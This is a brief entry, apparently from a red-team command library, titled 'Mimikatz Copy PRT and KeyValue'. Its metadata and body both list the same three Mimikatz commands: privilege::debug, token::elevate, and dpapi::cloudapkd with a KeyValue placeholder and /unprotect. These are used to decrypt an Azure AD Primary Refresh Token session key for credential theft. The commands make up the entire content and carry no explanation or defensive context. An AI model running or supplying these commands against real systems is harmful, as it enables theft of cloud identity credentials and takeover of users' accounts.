---
id: 26c96f28-1248-4afe-a495-fec1d76a7767
name: Mimikatz Copy PRT and KeyValue
type: command
executor: bash
data: 'Mimikatz> privilege::debug

  Mimikatz> token::elevate

  Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect'
output: null
created_at: '2023-05-25T16:44:24.679824+00:00'
updated_at: '2023-05-25T17:03:04.293884+00:00'
---

# Mimikatz Copy PRT and KeyValue

```bash
Mimikatz> privilege::debug
Mimikatz> token::elevate
Mimikatz> dpapi::cloudapkd /keyvalue:<KeyValue> /unprotect
```


